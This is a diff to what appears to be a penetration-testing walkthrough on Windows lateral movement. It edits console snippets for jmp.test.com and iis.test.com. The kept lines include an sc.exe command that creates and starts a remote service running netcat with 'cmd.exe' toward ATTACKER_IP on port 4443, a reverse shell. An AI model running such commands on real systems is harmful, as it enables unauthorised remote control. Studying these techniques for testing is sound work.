@@ -104,8 +104,7 @@ The listener on port **8888** will receive a remote command prompt on `jmp.test.
 
 {% code title="jmp.test.com (admin)" %}
 ```
-C:\Windows/system32> whoami
-admin
+C:\Windows/system32> 
 ```
 {% endcode %}
 
@@ -127,7 +126,8 @@ After performing the following actions, we will retrieve a reverse shell connect
 
 {% code title="iis.test.com (admin)" %}
 ```
-C:\> 
+C:\Windows/system32> hostname
+iis
 ```
 {% endcode %}
 
@@ -135,11 +135,11 @@ C:\>
 
 Note that it will not work if we tried to establish a reverse shell connection from the admin shell directly with `sc.exe` using the `binPath` option:
 
-{% code title="Attacker (admin)" overflow="wrap" %}
-```sh
-$ sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443" start= auto
+{% code title="jmp.test.com (admin)" overflow="wrap" %}
+```powershell
+C:\Windows/system32> sc.exe \\TARGET create <servicename> binPath= "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443" start= auto
 
-$ sc.exe \\TARGET start <servicename>
+C:\Windows/system32> sc.exe \\TARGET start <servicename>
 ```
 {% endcode %}
 
